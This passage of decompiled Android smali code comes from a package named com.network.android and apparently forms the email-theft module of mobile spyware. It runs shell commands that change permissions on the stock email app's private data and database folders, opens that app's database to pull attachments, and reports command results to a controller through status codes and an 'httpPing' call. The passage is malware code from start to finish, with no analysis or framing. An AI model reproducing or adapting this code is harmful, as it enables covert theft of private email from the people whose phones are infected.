    .catchall {:try_start_18 .. :try_end_18} :catchall_2

    :cond_d
    :goto_8
    :try_start_19
    const-string v1, "chmod 0751 /data/data/com.android.email; chmod 0771 /data/data/com.android.email/databases; "

    invoke-static {v1}, Lcom/network/android/m;->c(Ljava/lang/String;)V

    const-string v1, "0666"

    move-object/from16 v0, v16

    invoke-static {v0, v1}, Lcom/network/android/m;->a(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "getAttachmentFileCommand end"

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_19
    .catch Ljava/lang/Throwable; {:try_start_19 .. :try_end_19} :catch_9
    .catchall {:try_start_19 .. :try_end_19} :catchall_2

    if-eqz v14, :cond_e

    :try_start_1a
    invoke-virtual {v14}, Landroid/database/sqlite/SQLiteDatabase;->close()V

    :cond_e
    if-eqz v15, :cond_f

    invoke-interface {v15}, Landroid/database/Cursor;->close()V

    :cond_f
    invoke-interface/range {v17 .. v17}, Ljava/util/concurrent/locks/Lock;->unlock()V
    :try_end_1a
    .catch Ljava/lang/Throwable; {:try_start_1a .. :try_end_1a} :catch_5

    goto/16 :goto_0

    :catch_5
    move-exception v1

    :try_start_1b
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "get Mail finally- "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_1b
    .catch Ljava/lang/Throwable; {:try_start_1b .. :try_end_1b} :catch_0

    goto/16 :goto_0

    :cond_10
    :try_start_1c
    move-object/from16 v0, p0

    iget-object v3, v0, Lcom/network/android/u;->a:Ljava/lang/String;

    move-object/from16 v0, p0

    iget-object v4, v0, Lcom/network/android/u;->d:Ljava/lang/String;

    move-object/from16 v0, p0

    iget-object v1, v0, Lcom/network/android/u;->c:Landroid/content/Context;

    move-object v10, v11

    invoke-static/range {v3 .. v10}, Lcom/network/android/r;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_1c
    .catch Ljava/lang/Throwable; {:try_start_1c .. :try_end_1c} :catch_6
    .catchall {:try_start_1c .. :try_end_1c} :catchall_0

    goto/16 :goto_4

    :catch_6
    move-exception v1

    :try_start_1d
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "GetContentMail getAttachmentFileCommand chank error "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    move-object/from16 v0, p0

    iget-object v1, v0, Lcom/network/android/u;->d:Ljava/lang/String;

    if-eqz v1, :cond_11

    const/4 v1, 0x0

    const/16 v2, 0x79

    const-string v3, "GET_ATTACHMENT_NOT_AVAILABLE"

    move-object/from16 v0, p0

    iget-object v4, v0, Lcom/network/android/u;->d:Ljava/lang/String;

    invoke-static {v4}, Lcom/network/h/b;->c(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v4

    invoke-static {v1, v2, v3, v4}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;Ljava/lang/Object;)V

    const/4 v1, 0x0

    const/16 v2, -0x3cae

    const-string v3, ""

    move-object/from16 v0, p0

    iget-object v4, v0, Lcom/network/android/u;->d:Ljava/lang/String;

    invoke-static {v4}, Lcom/network/h/b;->c(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v4

    invoke-static {v1, v2, v3, v4}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;Ljava/lang/Object;)V
    :try_end_1d
    .catchall {:try_start_1d .. :try_end_1d} :catchall_0

    :cond_11
    move-object v4, v12

    goto/16 :goto_5

    :catchall_0
    move-exception v1

    :try_start_1e
    throw v1
    :try_end_1e
    .catch Ljava/lang/Throwable; {:try_start_1e .. :try_end_1e} :catch_7
    .catchall {:try_start_1e .. :try_end_1e} :catchall_1

    :catch_7
    move-exception v1

    move-object v2, v11

    move-object v3, v12

    :goto_9
    :try_start_1f
    new-instance v4, Ljava/lang/StringBuilder;

    const-string v6, "GetContentMail getAttachmentFileCommand- "

    invoke-direct {v4, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4, v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_1f
    .catch Ljava/lang/Throwable; {:try_start_1f .. :try_end_1f} :catch_12
    .catchall {:try_start_1f .. :try_end_1f} :catchall_1

    move-object v11, v2

    move-object v4, v3

    goto/16 :goto_5

    :cond_12
    :try_start_20
    const-string v1, "GetContentMail getAttachmentFileCommand- file does not exist "

    invoke-static {v1}, Lcom/network/android/c/a/a;->b(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v1, v0, Lcom/network/android/u;->d:Ljava/lang/String;

    if-eqz v1, :cond_13

    const/4 v1, 0x0

    const/16 v2, 0x79

    const-string v3, "GET_ATTACHMENT_NOT_AVAILABLE"

    move-object/from16 v0, p0

    iget-object v4, v0, Lcom/network/android/u;->d:Ljava/lang/String;

    invoke-static {v4}, Lcom/network/h/b;->c(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v4

    invoke-static {v1, v2, v3, v4}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;Ljava/lang/Object;)V

    const/4 v1, 0x0

    const/16 v2, -0x3cae

    const-string v3, ""

    move-object/from16 v0, p0

    iget-object v4, v0, Lcom/network/android/u;->d:Ljava/lang/String;

    invoke-static {v4}, Lcom/network/h/b;->c(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v4

    invoke-static {v1, v2, v3, v4}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;Ljava/lang/Object;)V

    :cond_13
    move-object/from16 v0, p0

    iget-object v1, v0, Lcom/network/android/u;->c:Landroid/content/Context;

    const-string v2, "httpPing"

    invoke-static {v1, v2}, Lcom/network/android/a/c;->a(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_20
    .catch Ljava/lang/Throwable; {:try_start_20 .. :try_end_20} :catch_7
    .catchall {:try_start_20 .. :try_end_20} :catchall_1

    move-object v4, v12

    goto/16 :goto_5

    :cond_14
    :try_start_21
    const-string v1, "getAttachmentFileCommand- no URI "

    invoke-static {v1}, Lcom/network/android/c/a/a;->b(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v1, v0, Lcom/network/android/u;->d:Ljava/lang/String;

    if-eqz v1, :cond_15

    const/4 v1, 0x1

    const/16 v2, 0x79

    const-string v6, "GET_ATTACHMENT_NOT_AVAILABLE"

    move-object/from16 v0, p0

    iget-object v7, v0, Lcom/network/android/u;->d:Ljava/lang/String;

    invoke-static {v7}, Lcom/network/h/b;->c(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v7

    invoke-static {v1, v2, v6, v7}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;Ljava/lang/Object;)V

    const/4 v1, 0x1

    const/16 v2, -0x3cae

    const-string v6, ""

    move-object/from16 v0, p0

    iget-object v7, v0, Lcom/network/android/u;->d:Ljava/lang/String;

    invoke-static {v7}, Lcom/network/h/b;->c(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v7

    invoke-static {v1, v2, v6, v7}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;Ljava/lang/Object;)V

    :cond_15
    move-object/from16 v0, p0

    iget-object v1, v0, Lcom/network/android/u;->c:Landroid/content/Context;

    const-string v2, "httpPing"

    invoke-static {v1, v2}, Lcom/network/android/a/c;->a(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_21
    .catch Ljava/lang/Throwable; {:try_start_21 .. :try_end_21} :catch_13
    .catchall {:try_start_21 .. :try_end_21} :catchall_1

    move-object v11, v3

    goto/16 :goto_5

    :cond_16
    const/4 v1, 0x1

    const/16 v2, 0x79

    :try_start_22
    const-string v3, "GET_ATTACHMENT_NOT_AVAILABLE"

    invoke-static {v1, v2, v3}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v1, v0, Lcom/network/android/u;->d:Ljava/lang/String;

    if-eqz v1, :cond_17

    const/4 v1, 0x1

    const/16 v2, 0x79

    const-string v3, "GET_ATTACHMENT_NOT_AVAILABLE"

    move-object/from16 v0, p0

    iget-object v4, v0, Lcom/network/android/u;->d:Ljava/lang/String;

    invoke-static {v4}, Lcom/network/h/b;->c(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v4

    invoke-static {v1, v2, v3, v4}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;Ljava/lang/Object;)V

    const/4 v1, 0x1

    const/16 v2, -0x3cae

    const-string v3, ""

    move-object/from16 v0, p0

    iget-object v4, v0, Lcom/network/android/u;->d:Ljava/lang/String;

    invoke-static {v4}, Lcom/network/h/b;->c(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v4

    invoke-static {v1, v2, v3, v4}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;Ljava/lang/Object;)V

    move-object/from16 v0, p0

    iget-object v1, v0, Lcom/network/android/u;->c:Landroid/content/Context;

    const-string v2, "httpPing"

    invoke-static {v1, v2}, Lcom/network/android/a/c;->a(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_22
    .catch Ljava/lang/Throwable; {:try_start_22 .. :try_end_22} :catch_4
    .catchall {:try_start_22 .. :try_end_22} :catchall_1

    :cond_17
    :goto_a
    if-eqz v13, :cond_d

    :try_start_23
    invoke-interface {v13}, Landroid/database/Cursor;->close()V
    :try_end_23
    .catch Ljava/lang/Exception; {:try_start_23 .. :try_end_23} :catch_8
    .catch Ljava/lang/Throwable; {:try_start_23 .. :try_end_23} :catch_9
    .catchall {:try_start_23 .. :try_end_23} :catchall_2

    goto/16 :goto_8

    :catch_8
    move-exception v1

    :try_start_24
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "GetContentMail getAttachmentFileCommand finaly- "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_24
    .catch Ljava/lang/Throwable; {:try_start_24 .. :try_end_24} :catch_9
    .catchall {:try_start_24 .. :try_end_24} :catchall_2

    goto/16 :goto_8

    :catch_9
    move-exception v1

    move-object v2, v14

    move-object v3, v15

    :goto_b
    :try_start_25
    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "get mail Throwable- "

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4, v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    move-object/from16 v0, p0

    iget-object v1, v0, Lcom/network/android/u;->d:Ljava/lang/String;

    if-eqz v1, :cond_18

    const/4 v1, 0x1

    const/16 v4, 0x78

    const-string v5, "GET_ATTACHMENT_FAIL"

    move-object/from16 v0, p0

    iget-object v6, v0, Lcom/network/android/u;->d:Ljava/lang/String;

    invoke-static {v6}, Lcom/network/h/b;->c(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v6

    invoke-static {v1, v4, v5, v6}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;Ljava/lang/Object;)V

    const/4 v1, 0x1

    const/16 v4, -0x3cae

    const-string v5, ""

    move-object/from16 v0, p0

    iget-object v6, v0, Lcom/network/android/u;->d:Ljava/lang/String;

    invoke-static {v6}, Lcom/network/h/b;->c(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v6

    invoke-static {v1, v4, v5, v6}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;Ljava/lang/Object;)V
    :try_end_25
    .catchall {:try_start_25 .. :try_end_25} :catchall_5

    :cond_18
    if-eqz v2, :cond_19

    :try_start_26
    invoke-virtual {v2}, Landroid/database/sqlite/SQLiteDatabase;->close()V

    :cond_19
    if-eqz v3, :cond_1a

    invoke-interface {v3}, Landroid/database/Cursor;->close()V

    :cond_1a
    invoke-interface/range {v17 .. v17}, Ljava/util/concurrent/locks/Lock;->unlock()V
    :try_end_26
    .catch Ljava/lang/Throwable; {:try_start_26 .. :try_end_26} :catch_a

    goto/16 :goto_0

    :catch_a
    move-exception v1

    :try_start_27
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "get Mail finally- "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_27
    .catch Ljava/lang/Throwable; {:try_start_27 .. :try_end_27} :catch_0

    goto/16 :goto_0

    :cond_1b
    const/4 v1, 0x1

    const/16 v2, 0x79

    :try_start_28
    const-string v3, "GET_ATTACHMENT_NOT_AVAILABLE"

    invoke-static {v1, v2, v3}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v1, v0, Lcom/network/android/u;->d:Ljava/lang/String;

    if-eqz v1, :cond_17

    const/4 v1, 0x1

    const/16 v2, 0x79

    const-string v3, "GET_ATTACHMENT_NOT_AVAILABLE"

    move-object/from16 v0, p0

    iget-object v4, v0, Lcom/network/android/u;->d:Ljava/lang/String;

    invoke-static {v4}, Lcom/network/h/b;->c(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v4

    invoke-static {v1, v2, v3, v4}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;Ljava/lang/Object;)V

    const/4 v1, 0x1

    const/16 v2, -0x3cae

    const-string v3, ""

    move-object/from16 v0, p0

    iget-object v4, v0, Lcom/network/android/u;->d:Ljava/lang/String;

    invoke-static {v4}, Lcom/network/h/b;->c(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v4

    invoke-static {v1, v2, v3, v4}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;Ljava/lang/Object;)V

    move-object/from16 v0, p0

    iget-object v1, v0, Lcom/network/android/u;->c:Landroid/content/Context;

    const-string v2, "httpPing"

    invoke-static {v1, v2}, Lcom/network/android/a/c;->a(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_28
    .catch Ljava/lang/Throwable; {:try_start_28 .. :try_end_28} :catch_4
    .catchall {:try_start_28 .. :try_end_28} :catchall_1

    goto/16 :goto_a

    :catchall_1
    move-exception v1

    :goto_c
    if-eqz v13, :cond_1c

    :try_start_29
    invoke-interface {v13}, Landroid/database/Cursor;->close()V
    :try_end_29
    .catch Ljava/lang/Exception; {:try_start_29 .. :try_end_29} :catch_c
    .catch Ljava/lang/Throwable; {:try_start_29 .. :try_end_29} :catch_9
    .catchall {:try_start_29 .. :try_end_29} :catchall_2

    :cond_1c
    :goto_d
    :try_start_2a
    throw v1
    :try_end_2a
    .catch Ljava/lang/Throwable; {:try_start_2a .. :try_end_2a} :catch_9
    .catchall {:try_start_2a .. :try_end_2a} :catchall_2

    :catchall_2
    move-exception v1

    :goto_e
    if-eqz v14, :cond_1d

    :try_start_2b
    invoke-virtual {v14}, Landroid/database/sqlite/SQLiteDatabase;->close()V

    :cond_1d
    if-eqz v15, :cond_1e

    invoke-interface {v15}, Landroid/database/Cursor;->close()V

    :cond_1e
    invoke-interface/range {v17 .. v17}, Ljava/util/concurrent/locks/Lock;->unlock()V
    :try_end_2b
    .catch Ljava/lang/Throwable; {:try_start_2b .. :try_end_2b} :catch_b

    :goto_f
    :try_start_2c
    throw v1

    :catch_b
    move-exception v2

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "get Mail finally- "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3, v2}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_2c
    .catch Ljava/lang/Throwable; {:try_start_2c .. :try_end_2c} :catch_0

    goto :goto_f

    :catch_c
    move-exception v2

    :try_start_2d
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "GetContentMail getAttachmentFileCommand finaly- "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3, v2}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_d

    :catch_d
    move-exception v1

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "GetContentMail getAttachmentFileCommand finaly- "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto/16 :goto_8

    :catch_e
    move-exception v1

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "GetContentMail getAttachmentFileCommand finaly- "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_2d
    .catch Ljava/lang/Throwable; {:try_start_2d .. :try_end_2d} :catch_9
    .catchall {:try_start_2d .. :try_end_2d} :catchall_2

    goto/16 :goto_3

    :catchall_3
    move-exception v1

    move-object v14, v2

    move-object v15, v3

    goto :goto_e

    :catchall_4
    move-exception v1

    move-object v15, v3

    goto :goto_e

    :catchall_5
    move-exception v1

    move-object v14, v2

    move-object v15, v3

    goto :goto_e

    :catch_f
    move-exception v1

    goto/16 :goto_b

    :catch_10
    move-exception v1

    move-object v2, v14

    goto/16 :goto_b

    :catchall_6
    move-exception v1

    move-object v13, v2

    goto/16 :goto_c

    :catchall_7
    move-exception v1

    move-object v13, v2

    goto/16 :goto_c

    :catch_11
    move-exception v1

    goto/16 :goto_7

    :catch_12
    move-exception v1

    move-object v4, v3

    goto/16 :goto_6

    :catch_13
    move-exception v1

    move-object v2, v3

    move-object v3, v4

    goto/16 :goto_9

    :catch_14
    move-exception v1

    move-object v3, v4

    goto/16 :goto_9

    :catch_15
    move-exception v1

    move-object v2, v11

    move-object v3, v4

    goto/16 :goto_9

    :cond_1f
    move-object v11, v3

    goto/16 :goto_2
.end method
